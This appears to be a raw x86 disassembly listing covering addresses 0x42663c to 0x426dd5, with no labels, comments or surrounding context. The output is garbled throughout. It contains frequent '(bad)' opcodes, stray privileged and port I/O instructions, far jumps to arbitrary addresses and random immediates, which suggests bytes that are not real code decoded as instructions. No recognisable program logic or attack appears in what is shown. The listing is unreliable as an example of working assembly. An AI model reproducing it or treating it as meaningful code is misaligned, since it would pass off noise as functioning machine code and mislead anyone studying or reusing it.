  42663c:	sbb    eax,0x3e0eb9d
  426641:	inc    esi
  426642:	aaa    
  426643:	sbb    BYTE PTR [ecx-0x2e],0xba
  426647:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  426649:	(bad)  
  42664a:	push   ebx
  42664b:	sub    cl,BYTE PTR [esi-0x23814f97]
  426651:	xchg   ebp,eax
  426652:	shr    ebx,cl
  426654:	retf   0xc901
  426657:	data16 and cl,BYTE PTR [esi+edx*4]
  42665b:	sbb    eax,0x1742d08a
  426660:	adc    esp,DWORD PTR ds:0xe6318fe3
  426666:	mov    ch,0xdc
  426668:	add    eax,0xf715d49e
  42666d:	pop    eax
  42666e:	mov    ah,0x6f
  426670:	retf   
  426671:	lock add esp,DWORD PTR [esi]
  426674:	xor    bh,dl
  426676:	mov    ebx,eax
  426678:	lods   eax,DWORD PTR ds:[esi]
  426679:	sub    dl,BYTE PTR [ebx]
  42667b:	pop    es
  42667c:	ins    DWORD PTR es:[edi],dx
  42667d:	or     eax,0x3d14cc52
  426682:	out    dx,al
  426683:	mov    esp,0x8b71f23c
  426688:	cwde   
  426689:	test   DWORD PTR [esp+eiz*2+0x73],edi
  42668d:	rcl    BYTE PTR [esi+0x2dc988e6],0x99
  426694:	lods   al,BYTE PTR ds:[esi]
  426695:	sub    DWORD PTR [ebp+0x15],ebp
  426698:	xchg   BYTE PTR [ecx-0x2c],cl
  42669b:	mov    bh,0x77
  42669d:	xor    al,0x43
  42669f:	inc    esp
  4266a0:	les    ecx,FWORD PTR [esi]
  4266a2:	add    al,0xef
  4266a4:	out    0xde,eax
  4266a6:	xor    ch,cl
  4266a8:	(bad)  
  4266a9:	jge    0x4266f1
  4266ab:	leave  
  4266ac:	mov    ebp,0x7253a696
  4266b1:	xchg   edx,eax
  4266b2:	cmovnp eax,edx
  4266b5:	jg     0x4266e5
  4266b7:	adc    bh,BYTE PTR [edi-0x77b90997]
  4266bd:	mov    ebp,0x4c8cdd7c
  4266c2:	cmc    
  4266c3:	mov    DWORD PTR [eax],ebp
  4266c5:	mov    edi,DWORD PTR gs:0x35628729
  4266cc:	sar    BYTE PTR [ebx+0x69145e72],cl
  4266d2:	and    eax,0x76a9f4e3
  4266d7:	and    bl,BYTE PTR [eax-0x20]
  4266da:	adc    BYTE PTR [esi],cl
  4266dc:	pop    eax
  4266dd:	rcl    BYTE PTR [esi+0x7e],cl
  4266e0:	or     eax,0x61ca05df
  4266e5:	push   esi
  4266e6:	ret    0x616a
  4266e9:	xor    BYTE PTR [esi+edx*2+0x5d],bl
  4266ed:	and    BYTE PTR [ebx+ecx*8],al
  4266f0:	sub    eax,0x6359403c
  4266f5:	out    0xd8,eax
  4266f7:	test   DWORD PTR [esi-0xf],ebx
  4266fa:	sub    eax,0x8acba17c
  4266ff:	push   0xffffffd8
  426701:	mov    al,0xdf
  426703:	mov    esp,0xa81678b0
  426708:	ins    DWORD PTR es:[edi],dx
  426709:	fwait
  42670a:	xchg   DWORD PTR [ebx-0x17],esp
  42670d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42670e:	(bad)  
  42670f:	popf   
  426710:	out    0xc3,eax
  426712:	fldenv [edi+0x72]
  426715:	cmc    
  426716:	mov    ss,WORD PTR [ecx]
  426718:	outs   dx,DWORD PTR ds:[esi]
  426719:	stos   BYTE PTR es:[edi],al
  42671a:	ja     0x426737
  42671c:	cmp    al,0xf6
  42671e:	pop    eax
  42671f:	sub    cl,BYTE PTR [eax]
  426721:	jnp    0x42678e
  426723:	sub    eax,0x563e1f26
  426728:	pop    edi
  426729:	mov    edi,0x383f7b43
  42672e:	xchg   esp,eax
  42672f:	and    al,0x2c
  426731:	jmp    0x4266c1
  426733:	adc    BYTE PTR [ebp+0x42],bh
  426736:	lea    edi,ds:[ecx-0x68106a7e]
  42673d:	iret   
  42673e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42673f:	xchg   ch,bh
  426741:	xchg   ebx,eax
  426742:	add    eax,0x670beb43
  426747:	inc    ebp
  426748:	and    ax,0xf6bc
  42674c:	ss jo  0x42677a
  42674f:	push   es
  426750:	lods   eax,DWORD PTR ds:[esi]
  426751:	pop    esp
  426752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426753:	push   esp
  426754:	adc    dh,dh
  426756:	push   ebx
  426757:	sub    DWORD PTR [ebp-0x6a54eb40],edx
  42675d:	retf   0x32f
  426760:	inc    ebp
  426761:	cmp    DWORD PTR [esp+eax*8],ebx
  426764:	shl    DWORD PTR [eax+ecx*4],0xc0
  426768:	shl    ebx,cl
  42676a:	imul   esi,DWORD PTR [eax+esi*4+0x54deaef4],0x61
  426772:	pop    ss
  426773:	and    DWORD PTR [edi-0xceeb459],edx
  426779:	inc    edx
  42677a:	push   ds
  42677b:	cmp    eax,0x3075ffc7
  426780:	mov    bl,0x47
  426782:	push   ds
  426783:	adc    al,0xc0
  426785:	or     ah,BYTE PTR [edx-0x5b]
  426788:	mov    ds:0xcea6e2f4,al
  42678d:	sub    eax,DWORD PTR [eax]
  42678f:	add    BYTE PTR [eax],al
  426791:	add    BYTE PTR [ecx-0x126c16dc],al
  426797:	(bad)  
  426799:	ss cwde 
  42679b:	in     eax,0x27
  42679d:	inc    esp
  42679e:	jmp    0xf17490b4
  4267a3:	fild   WORD PTR [ecx]
  4267a5:	add    ah,dh
  4267a7:	add    al,0x0
  4267a9:	add    BYTE PTR [edx+edx*8-0x70],dl
  4267ad:	ss ret 0x450b
  4267b1:	dec    ebp
  4267b2:	out    0xe,eax
  4267b4:	cmp    ebx,DWORD PTR [ebx-0x166ef00c]
  4267ba:	dec    BYTE PTR [edx+0x46]
  4267bd:	inc    esp
  4267be:	iret   
  4267bf:	pop    ds
  4267c0:	mov    cs,WORD PTR ds:0x4c347e3d
  4267c6:	or     ecx,ecx
  4267c8:	xchg   BYTE PTR [ecx],ah
  4267ca:	test   BYTE PTR [ebx],dl
  4267cc:	xchg   edx,eax
  4267cd:	cmc    
  4267ce:	sub    al,0x6e
  4267d0:	imul   eax,DWORD PTR [ebx],0xffffff83
  4267d3:	dec    ecx
  4267d4:	jecxz  0x42677d
  4267d6:	mov    esi,0x609f565f
  4267db:	(bad)  
  4267dc:	xchg   edx,eax
  4267dd:	fwait
  4267de:	mov    dh,0xea
  4267e0:	dec    ebx
  4267e1:	and    DWORD PTR [esi-0x565322bf],eax
  4267e7:	nop
  4267e8:	push   esi
  4267e9:	xchg   ecx,eax
  4267ea:	fcom   DWORD PTR [esi+esi*8+0x1e]
  4267ee:	or     DWORD PTR [ebx],esp
  4267f0:	pop    ebx
  4267f1:	icebp  
  4267f2:	push   0xffffffc7
  4267f4:	jb     0x426791
  4267f6:	cmp    al,0x1c
  4267f8:	xor    ch,dl
  4267fa:	jmp    0x6e8b:0x883d853b
  426801:	sub    eax,0x164cf932
  426806:	pop    ebx
  426807:	retf   0xa817
  42680a:	js     0x426802
  42680c:	xchg   ecx,eax
  42680d:	lea    esi,gs:[eax-0x59e0d90c]
  426814:	out    dx,eax
  426815:	je     0x426889
  426817:	daa    
  426818:	inc    DWORD PTR [esp+eiz*4+0x9a6a08]
  42681f:	ss daa 
  426821:	ins    BYTE PTR es:[edi],dx
  426822:	mov    ch,0x98
  426824:	add    ebp,DWORD PTR [ebp+edi*4+0x12]
  426828:	lea    edi,[esi]
  42682a:	fdivr  DWORD PTR [ecx]
  42682c:	stos   BYTE PTR es:[edi],al
  42682d:	(bad)  
  42682e:	iret   
  42682f:	lock shl DWORD PTR [ecx+0x50],cl
  426833:	cdq    
  426834:	adc    al,0x50
  426836:	lock mov eax,ds:0x870057c8
  42683c:	and    ecx,ebx
  42683e:	out    0x44,al
  426840:	imul   ebp,DWORD PTR [ebx-0x18c408db],0x78
  426847:	and    DWORD PTR [eax],ebp
  426849:	scas   al,BYTE PTR es:[edi]
  42684a:	fdiv   st(7),st
  42684c:	out    dx,eax
  42684d:	cld    
  42684e:	inc    ecx
  42684f:	nop
  426850:	cmp    al,0x37
  426852:	mov    ds:0x76c0e81,eax
  426857:	in     al,0xd3
  426859:	xor    BYTE PTR [eax],0x17
  42685c:	dec    edx
  42685d:	xchg   ecx,eax
  42685e:	fs lock sub edi,ecx
  426862:	inc    eax
  426863:	add    BYTE PTR ds:[edx*4-0xff47cd1],dh
  42686b:	mov    ebp,0x2822432
  426870:	jge    0x4268db
  426872:	cld    
  426873:	mov    DWORD PTR [esi-0x12],0x7f66aacf
  42687a:	jb     0x4268c1
  42687c:	das    
  42687d:	xor    esp,DWORD PTR [esi+0x69]
  426880:	mov    bh,0x32
  426882:	ins    DWORD PTR es:[edi],dx
  426883:	int    0xdd
  426885:	(bad)  [eax+0x3e]
  426888:	mov    edi,0x48f7cdc4
  42688d:	stc    
  42688e:	add    DWORD PTR [ecx+0x13],0xffffffc2
  426892:	xor    esi,ecx
  426894:	loope  0x4268ff
  426896:	and    edx,DWORD PTR [eax+0x77]
  426899:	imul   ebx,DWORD PTR [esi+0x25],0xffffff97
  42689d:	push   ebp
  42689e:	aad    0xf2
  4268a0:	push   ebp
  4268a1:	jecxz  0x4268d4
  4268a3:	cmp    al,0x5a
  4268a5:	adc    eax,0xe6140a15
  4268aa:	cli    
  4268ab:	ret    
  4268ac:	inc    ebp
  4268ad:	adc    bl,BYTE PTR [esi+esi*2+0x78d911ef]
  4268b4:	addr16 call 0xbb82:0x6419947e
  4268bc:	mov    dh,BYTE PTR ds:0x5abb6dbd
  4268c2:	repnz cmc 
  4268c4:	popf   
  4268c5:	xlat   BYTE PTR ds:[ebx]
  4268c6:	cli    
  4268c7:	jle    0x426923
  4268c9:	or     DWORD PTR [eax+0xaebd8a9],edx
  4268cf:	dec    ebx
  4268d0:	jne    0x426922
  4268d2:	jmp    0x42694b
  4268d4:	dec    esi
  4268d5:	mov    eax,0xfea00d43
  4268da:	push   0xffffffd0
  4268dc:	(bad)  
  4268dd:	mov    bh,0xc
  4268df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268e0:	inc    esp
  4268e1:	jecxz  0x426942
  4268e3:	or     eax,0xb01fb934
  4268e8:	cmc    
  4268e9:	cmp    BYTE PTR [edx+0x3d],bl
  4268ec:	pusha  
  4268ed:	inc    edi
  4268ee:	popa   
  4268ef:	jle    0x4268af
  4268f1:	popf   
  4268f2:	mov    ecx,0xdd489c69
  4268f7:	cmp    al,0x55
  4268f9:	repnz mov es,WORD PTR [esi-0x80]
  4268fd:	jb     0x42690f
  4268ff:	out    dx,eax
  426900:	xchg   esi,eax
  426901:	ficom  WORD PTR [eax]
  426903:	jecxz  0x426969
  426905:	sar    BYTE PTR [ebp-0x56],0x65
  426909:	and    DWORD PTR [esi+eax*4],edi
  42690c:	fcomp  DWORD PTR [edx]
  42690e:	aas    
  42690f:	xchg   edx,eax
  426910:	ins    BYTE PTR es:[edi],dx
  426911:	or     ecx,DWORD PTR ds:0xa7c7c415
  426917:	imul   ebx,ebp,0x4a
  42691a:	inc    esp
  42691b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42691c:	add    esi,DWORD PTR [esi+0x48]
  42691f:	loopne 0x426948
  426921:	and    al,0x42
  426923:	(bad)
  426926:	fiadd  DWORD PTR [ebp+ebx*1+0xdcd03d4]
  42692d:	xlat   BYTE PTR ds:[ebx]
  42692e:	xor    DWORD PTR [edi+edi*2],ebp
  426931:	inc    ebx
  426932:	jo     0x426903
  426934:	and    dl,BYTE PTR [esi+0x2b]
  426937:	aad    0x1b
  426939:	imul   ecx,DWORD PTR ds:0x7521c22a,0x1d
  426940:	ja     0x4268dc
  426942:	(bad)  
  426943:	xor    BYTE PTR [esi+edi*2+0x7d],ah
  426947:	call   0x38cbddb8
  42694c:	jmp    0x7aac6fe2
  426951:	icebp  
  426952:	cwde   
  426953:	pop    ss
  426954:	mov    ch,0x11
  426956:	adc    ebx,DWORD PTR [esp+eax*8-0x7920ad10]
  42695d:	dec    cl
  42695f:	jb     0x4269c6
  426961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426962:	loop   0x4269e2
  426964:	pop    ds
  426965:	ds int 0xcd
  426968:	and    edx,DWORD PTR [edx-0x44ad71ea]
  42696e:	mov    dl,0x8c
  426970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426971:	or     cl,BYTE PTR [esi-0x4c80de84]
  426977:	pop    ss
  426978:	not    DWORD PTR [edx+0x27]
  42697b:	xor    edx,DWORD PTR [esi+0x72e2061]
  426981:	add    al,0x3b
  426983:	fist   DWORD PTR [ebp-0x8]
  426986:	pop    edx
  426987:	in     eax,dx
  426988:	jnp    0x4269e1
  42698a:	mov    eax,0x8740c4a4
  42698f:	add    BYTE PTR [ebx-0x74212df2],dh
  426995:	add    BYTE PTR [edx-0x69b8e688],cl
  42699b:	pop    ss
  42699c:	les    esp,FWORD PTR [ecx+0x46749249]
  4269a2:	mov    ch,0x9e
  4269a4:	test   eax,0x6ca3ee5f
  4269a9:	mov    ds:0x658bdb15,eax
  4269ae:	and    al,BYTE PTR [edi-0x7d]
  4269b1:	ins    DWORD PTR es:[edi],dx
  4269b2:	dec    edx
  4269b3:	mov    eax,0x50a98004
  4269b8:	add    edi,0x7e57e3ba
  4269be:	mov    esp,DWORD PTR [ecx]
  4269c0:	in     eax,dx
  4269c1:	and    BYTE PTR [eax+0x28],dh
  4269c4:	retf   
  4269c5:	push   eax
  4269c6:	adc    DWORD PTR [ecx],edx
  4269c8:	int    0xf4
  4269ca:	jb     0x426a2c
  4269cc:	test   eax,0x76b4de02
  4269d1:	sub    dh,BYTE PTR [edi-0x45]
  4269d4:	lock das 
  4269d6:	pop    ds
  4269d7:	cmp    BYTE PTR ds:0xf6bf9c6b,dl
  4269dd:	mov    eax,0x876a9e5d
  4269e2:	pop    ss
  4269e3:	adc    BYTE PTR [edi-0x712fe6c1],ch
  4269e9:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4269eb:	inc    edi
  4269ec:	sbb    BYTE PTR [esi],cl
  4269ee:	jmp    0x7b86653b
  4269f3:	popf   
  4269f4:	sub    eax,0x6541a89d
  4269f9:	dec    edi
  4269fa:	out    0xa5,eax
  4269fc:	xchg   DWORD PTR [edx],esi
  4269fe:	dec    edi
  4269ff:	aam    0x28
  426a01:	xchg   ebx,eax
  426a02:	rol    dl,0xd0
  426a05:	in     al,0x8b
  426a07:	loopne 0x42698e
  426a09:	mov    dh,0x9c
  426a0b:	fdivr  DWORD PTR [edx-0x3a82fa96]
  426a11:	shl    bh,cl
  426a13:	pop    ebx
  426a14:	out    0x0,al
  426a16:	(bad)  
  426a17:	loop   0x4269fd
  426a19:	push   0x48a9761b
  426a1e:	push   ebx
  426a1f:	mov    ecx,0xcb2dace9
  426a24:	mov    al,ds:0xc863fe27
  426a29:	inc    edx
  426a2a:	icebp  
  426a2b:	pop    edi
  426a2c:	cs push edx
  426a2e:	int3   
  426a2f:	dec    esp
  426a30:	pop    ss
  426a31:	popf   
  426a32:	mov    cl,BYTE PTR [ecx-0x5f]
  426a35:	mov    ds:0x398385bc,al
  426a3a:	in     eax,dx
  426a3b:	(bad)  
  426a3c:	or     eax,0xf809c67e
  426a41:	jg     0x426a10
  426a43:	mov    ch,0x15
  426a45:	push   ss
  426a46:	dec    DWORD PTR [esp+esi*8+0x23]
  426a4a:	add    eax,0x370a9a8f
  426a4f:	and    DWORD PTR [eax+0x76],ebx
  426a52:	sar    esi,1
  426a54:	fucomi st,st(4)
  426a56:	retf   0x84c1
  426a59:	jno    0x426a49
  426a5b:	sti    
  426a5c:	call   0x401ac878
  426a61:	xchg   BYTE PTR [ecx-0x42],cl
  426a64:	lods   eax,DWORD PTR ds:[esi]
  426a65:	inc    esi
  426a66:	dec    eax
  426a67:	test   BYTE PTR [esi],0x72
  426a6a:	and    eax,esp
  426a6c:	cmp    bl,BYTE PTR [edx-0x56]
  426a6f:	cld    
  426a70:	adc    eax,0xab0d90ad
  426a75:	xor    al,0xa6
  426a77:	ins    DWORD PTR es:[edi],dx
  426a78:	inc    ecx
  426a79:	mov    WORD PTR [eax-0x1ae4c86e],ss
  426a7f:	sbb    edx,DWORD PTR [eax-0x5d]
  426a82:	mov    eax,ds:0xe5edb386
  426a87:	or     al,0x6c
  426a89:	cmp    DWORD PTR [esi],ebx
  426a8b:	xchg   edx,eax
  426a8c:	cli    
  426a8d:	push   esp
  426a8e:	ss jns 0x426a8c
  426a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a92:	push   bp
  426a94:	push   ebp
  426a95:	sub    dh,BYTE PTR ds:0x3b49eae8
  426a9b:	adc    eax,0x5bc523e2
  426aa0:	ret    0x9b0
  426aa3:	sub    DWORD PTR [ebx+0x72cc4b34],edx
  426aa9:	sub    edi,DWORD PTR [edi-0x34]
  426aac:	aam    0x8f
  426aae:	lahf   
  426aaf:	mov    DWORD PTR [edi+ebp*8+0x10],0xd08145f8
  426ab7:	(bad)  
  426ab8:	iret   
  426ab9:	jb     0x426a88
  426abb:	mov    ?,WORD PTR [ebx-0x67]
  426abe:	pop    esi
  426abf:	push   ecx
  426ac0:	mov    ecx,0x101e18dd
  426ac5:	cmp    al,0x8d
  426ac7:	pop    ecx
  426ac8:	shr    BYTE PTR [edi+edx*1+0x5c],0xdb
  426acd:	(bad)  
  426ace:	pop    edi
  426acf:	mov    esi,0xdbcfbcd7
  426ad4:	mov    esp,0xbe87bd38
  426ad9:	add    bl,dh
  426adb:	pop    ebx
  426adc:	mov    dh,0x2f
  426ade:	in     al,dx
  426adf:	dec    eax
  426ae0:	cmp    eax,0x82e41970
  426ae5:	jne    0x426ac6
  426ae7:	and    DWORD PTR [ebx],eax
  426ae9:	clc    
  426aea:	jp     0x426ab3
  426aec:	mov    ch,0x80
  426aee:	mov    esp,0xe4d4c756
  426af3:	jne    0x426b46
  426af5:	mov    DWORD PTR ss:[esi-0x4242453f],ebx
  426afc:	mov    edi,0xdc5cf774
  426b01:	mov    DWORD PTR [ebx+0x78edda09],edx
  426b07:	stos   DWORD PTR es:[edi],eax
  426b08:	push   ebx
  426b09:	mov    ch,0xf2
  426b0b:	inc    edi
  426b0c:	push   esp
  426b0d:	sub    al,ch
  426b0f:	je     0x426ab7
  426b11:	sahf   
  426b12:	pop    esp
  426b13:	adc    eax,DWORD PTR [ecx]
  426b15:	ds jae 0x426b12
  426b18:	cmp    DWORD PTR [ebx+0x205f5ef2],0xffffffbc
  426b1f:	stos   BYTE PTR es:[edi],al
  426b20:	push   ss
  426b21:	cmp    al,0x6
  426b23:	mov    cs,ebp
  426b25:	inc    esi
  426b26:	mov    dh,0x55
  426b28:	fiadd  WORD PTR [ebx-0x262abd37]
  426b2e:	fmul   DWORD PTR [edx-0x3a9bc0b3]
  426b34:	jle    0x426b53
  426b36:	mov    esp,0x3cbd0b2a
  426b3b:	shl    BYTE PTR [edx],0xa7
  426b3e:	push   0xd110466d
  426b43:	push   ebp
  426b44:	pop    edi
  426b45:	ror    bl,1
  426b47:	push   eax
  426b48:	or     al,BYTE PTR [ebp+0x73]
  426b4b:	arpl   WORD PTR [ecx+0x6e],si
  426b4e:	scas   al,BYTE PTR es:[edi]
  426b4f:	push   ebx
  426b50:	dec    edx
  426b51:	scas   eax,DWORD PTR es:[edi]
  426b52:	popf   
  426b53:	lods   al,BYTE PTR ds:[esi]
  426b54:	add    DWORD PTR [edx+0x4e],esp
  426b57:	aas    
  426b58:	ins    DWORD PTR es:[edi],dx
  426b59:	add    BYTE PTR [edx-0x29],0xb6
  426b5d:	dec    edi
  426b5e:	frstor ds:0xdbf9fc1d
  426b64:	aad    0x8d
  426b66:	call   0x9a2f5273
  426b6b:	push   eax
  426b6c:	in     eax,dx
  426b6d:	loop   0x426bb4
  426b6f:	xchg   esp,eax
  426b70:	dec    eax
  426b71:	mov    dh,0x27
  426b73:	(bad)  
  426b74:	clc    
  426b75:	mov    bh,BYTE PTR [eax-0x47b6a30d]
  426b7b:	mov    eax,ds:0xdb258d53
  426b80:	ins    BYTE PTR es:[edi],dx
  426b81:	call   DWORD PTR [ebp+0x63]
  426b84:	xchg   BYTE PTR [esi-0x1e],dh
  426b87:	push   ds
  426b88:	hlt    
  426b89:	and    eax,0x56f1eb7f
  426b8e:	xchg   ecx,eax
  426b8f:	cs jmp 0x426b1b
  426b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b93:	popa   
  426b94:	stc    
  426b95:	inc    eax
  426b96:	pop    eax
  426b97:	add    BYTE PTR [esi-0x4b],ah
  426b9a:	fdivr  QWORD PTR [esi-0x5e4418b9]
  426ba0:	test   DWORD PTR [ebx-0x4d],ecx
  426ba3:	pop    ecx
  426ba4:	pop    ss
  426ba5:	fist   WORD PTR [ebp+0x1ff6f7e0]
  426bab:	push   ebp
  426bac:	xchg   ecx,eax
  426bad:	dec    ebp
  426bae:	clc    
  426baf:	push   es
  426bb0:	lahf   
  426bb1:	add    DWORD PTR [edi+0x5a6e8941],ebx
  426bb7:	mov    ebx,0x4267a3d8
  426bbc:	in     al,0x78
  426bbe:	jmp    0x8dd1:0x9d7739f2
  426bc5:	retf   
  426bc6:	test   BYTE PTR [eax-0x5a],bl
  426bc9:	mov    ebp,0xed7437cf
  426bce:	ret    
  426bcf:	sar    ah,1
  426bd1:	ins    DWORD PTR es:[edi],dx
  426bd2:	imul   edx,esp,0x37
  426bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bd6:	cmp    eax,0x2b406aae
  426bdb:	(bad)  
  426bdd:	add    eax,0x23fb5045
  426be2:	ja     0x426c16
  426be4:	pop    esp
  426be5:	imul   ecx,DWORD PTR [edi],0x7a
  426be8:	add    DWORD PTR [eax],edx
  426bea:	jmp    0x8cb07678
  426bef:	jns    0x426c4a
  426bf1:	xchg   edx,eax
  426bf2:	test   DWORD PTR [ecx+0x43c6f2f5],edi
  426bf8:	lods   eax,DWORD PTR ds:[esi]
  426bf9:	inc    edi
  426bfa:	cmc    
  426bfb:	sub    esi,eax
  426bfd:	pop    es
  426bfe:	add    al,0x45
  426c00:	es add al,0xc5
  426c03:	xchg   ebp,eax
  426c04:	mov    bl,0x19
  426c06:	jbe    0x426c06
  426c08:	mov    ds:0xc65551cc,eax
  426c0d:	sbb    DWORD PTR [esi+0x2bf68019],edi
  426c13:	and    BYTE PTR ds:[ecx+0x3],ch
  426c17:	js     0x426b9c
  426c19:	mov    ds:0x8c8286cc,eax
  426c1e:	jecxz  0x426bf7
  426c20:	or     ch,BYTE PTR [ecx+0x6238f93f]
  426c26:	sub    esp,DWORD PTR [ebx+0x2a2d52f6]
  426c2c:	hlt    
  426c2d:	mov    eax,0xd300a6ca
  426c32:	pop    ebp
  426c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c34:	push   edi
  426c35:	or     bh,BYTE PTR [esi+0x14]
  426c38:	cmp    BYTE PTR [edx-0x17d4fc84],ah
  426c3e:	pop    es
  426c3f:	jno    0x426be3
  426c41:	test   al,dh
  426c43:	mov    BYTE PTR [eax+0x4ea80734],dh
  426c49:	js     0x426be1
  426c4b:	bound  esp,QWORD PTR [ebx]
  426c4d:	js     0x426c9f
  426c4f:	mov    WORD PTR [eax+0x7c],es
  426c52:	aas    
  426c53:	mov    ?,WORD PTR [edx-0x79]
  426c56:	mov    esp,0x1eb10350
  426c5b:	inc    edx
  426c5c:	leave  
  426c5d:	mov    gs,WORD PTR [esi-0x76]
  426c60:	test   BYTE PTR [ebx+0x5c],0x85
  426c64:	xlat   BYTE PTR ds:[ebx]
  426c65:	mov    ebp,esi
  426c67:	mov    ecx,0xafc62cfd
  426c6c:	adc    ebx,DWORD PTR [ecx+0x79]
  426c6f:	lods   al,BYTE PTR ds:[esi]
  426c70:	and    esi,DWORD PTR [eax]
  426c72:	sahf   
  426c73:	fwait
  426c74:	adc    eax,0x634338ab
  426c79:	fdivr  QWORD PTR [edx+0x16]
  426c7c:	pop    ds
  426c7d:	out    dx,al
  426c7e:	(bad)  
  426c7f:	or     cl,BYTE PTR [edi+0xb58f7ec]
  426c85:	ins    DWORD PTR es:[edi],dx
  426c86:	aam    0x6d
  426c88:	sub    dl,BYTE PTR [eax+0x55]
  426c8b:	jo     0x426c3e
  426c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c8e:	or     dl,al
  426c90:	dec    esp
  426c91:	imul   ebx,DWORD PTR [eax-0x1b0d20f4],0x5f
  426c98:	retf   
  426c99:	iret   
  426c9a:	adc    BYTE PTR [ecx],ah
  426c9c:	adc    eax,0x68
  426ca1:	add    BYTE PTR [esi+0x5f451fc0],dl
  426ca7:	(bad)  
  426ca9:	rol    DWORD PTR [ebx+0x6de88e10],cl
  426caf:	jle    0x426c4e
  426cb1:	pop    es
  426cb2:	in     eax,0xe4
  426cb4:	add    DWORD PTR [eax],eax
  426cb6:	hlt    
  426cb7:	add    al,0x0
  426cb9:	add    ah,ah
  426cbb:	rcr    DWORD PTR [eax],0x36
  426cbe:	push   ecx
  426cbf:	cmp    DWORD PTR [ebx],esp
  426cc1:	dec    eax
  426cc2:	inc    ebp
  426cc3:	data16 test al,0xd1
  426cc6:	cmp    edi,0xd084777a
  426ccc:	das    
  426ccd:	inc    edi
  426cce:	loopne 0x426c93
  426cd0:	jecxz  0x426d19
  426cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cd3:	aam    0x63
  426cd5:	(bad)  
  426cd6:	icebp  
  426cd7:	push   ecx
  426cd8:	dec    esi
  426cd9:	out    dx,al
  426cda:	retf   
  426cdb:	aas    
  426cdc:	call   0x91c208b2
  426ce1:	adc    DWORD PTR [eax*8-0x14337c9a],ebx
  426ce8:	or     ch,BYTE PTR [edx+0x7757d85]
  426cee:	call   FWORD PTR [edx]
  426cf0:	fmul   QWORD PTR [ecx+0x27]
  426cf3:	leave  
  426cf4:	pusha  
  426cf5:	ins    DWORD PTR es:[di],dx
  426cf7:	shl    dh,1
  426cf9:	and    eax,0x759bb318
  426cfe:	sti    
  426cff:	xor    dh,dh
  426d01:	dec    ebp
  426d02:	out    dx,eax
  426d03:	sub    dl,BYTE PTR [ebx+0x2b696555]
  426d09:	ror    BYTE PTR [edi],cl
  426d0b:	inc    ecx
  426d0c:	dec    esp
  426d0d:	dec    eax
  426d0e:	fucomi st,st(0)
  426d10:	int    0xaf
  426d12:	xchg   esp,eax
  426d13:	icebp  
  426d14:	jle    0x426d27
  426d16:	hlt    
  426d17:	shl    cl,cl
  426d19:	mov    ebp,0x7fed5dee
  426d1e:	and    dh,BYTE PTR es:[esi-0x1ac2e03c]
  426d25:	dec    esi
  426d26:	outs   dx,BYTE PTR ds:[esi]
  426d27:	and    ah,cl
  426d29:	mov    WORD PTR [edx-0x35],?
  426d2c:	(bad)  
  426d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d2e:	push   esi
  426d2f:	fwait
  426d30:	imul   ecx,DWORD PTR [ebp+0x2a353cdf],0x5c
  426d37:	in     al,dx
  426d38:	mov    edi,0xcec9a944
  426d3d:	mov    ss,ecx
  426d3f:	lods   eax,DWORD PTR ds:[esi]
  426d40:	dec    ebx
  426d41:	scas   al,BYTE PTR es:[edi]
  426d42:	int    0x7d
  426d44:	mov    ds:0xdbe5d30d,al
  426d49:	bound  ecx,QWORD PTR [ebx-0x50c3126b]
  426d4f:	add    bl,BYTE PTR [ebx]
  426d51:	cmp    esi,DWORD PTR [edx+edi*1+0x3]
  426d55:	ficom  DWORD PTR [ebx-0x47]
  426d58:	or     al,0x81
  426d5a:	test   DWORD PTR [ebx+0x2f],eax
  426d5d:	mov    bl,0x62
  426d5f:	rcr    DWORD PTR [ebx+0xe],0x72
  426d63:	cmp    BYTE PTR [edx],bl
  426d65:	(bad)  
  426d66:	jg     0x426d58
  426d68:	cld    
  426d69:	sti    
  426d6a:	mov    esp,0x68c17a7e
  426d6f:	jb     0x426cf7
  426d71:	push   ebp
  426d72:	mov    ecx,ebx
  426d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d75:	(bad)
  426d79:	loope  0x426dab
  426d7b:	jl     0x426d39
  426d7d:	sub    ah,BYTE PTR [ecx+eiz*2+0x78]
  426d81:	xchg   ebx,eax
  426d82:	gs loop 0x426d24
  426d85:	ins    BYTE PTR es:[edi],dx
  426d86:	lods   al,BYTE PTR ds:[esi]
  426d87:	mov    dl,0xdb
  426d89:	ror    DWORD PTR [ebx+0x93908a7],0xe8
  426d90:	into   
  426d91:	cld    
  426d92:	xor    BYTE PTR [esi+eax*8+0x3511264],bl
  426d99:	in     eax,0x69
  426d9b:	adc    BYTE PTR [edx-0x7ce5d699],ah
  426da1:	sub    BYTE PTR [esi+0x4],bl
  426da4:	pushf  
  426da5:	xchg   BYTE PTR [eax],al
  426da7:	ffree  st(3)
  426da9:	pop    edx
  426daa:	test   al,0xa8
  426dac:	jnp    0x426d4c
  426dae:	mov    gs,WORD PTR [edi+0x6b]
  426db1:	mov    ds:0x66f93467,eax
  426db7:	adc    ecx,DWORD PTR [edi-0x3]
  426dba:	fadd   QWORD PTR [ebx-0x4b]
  426dbd:	mov    DWORD PTR [ecx-0x1c],esi
  426dc0:	addr16 adc ebx,edi
  426dc3:	push   es
  426dc4:	push   cs
  426dc5:	leave  
  426dc6:	xchg   edx,eax
  426dc7:	mov    cl,0xcb
  426dc9:	jecxz  0x426d63
  426dcb:	push   ecx
  426dcc:	lahf   
  426dcd:	adc    BYTE PTR [ebx+eiz*1],dh
  426dd0:	dec    ebx
  426dd1:	inc    edx
  426dd2:	(bad)  
  426dd3:	je     0x426e52
  426dd5:	fiadd  DWORD PTR [ecx+0x14]
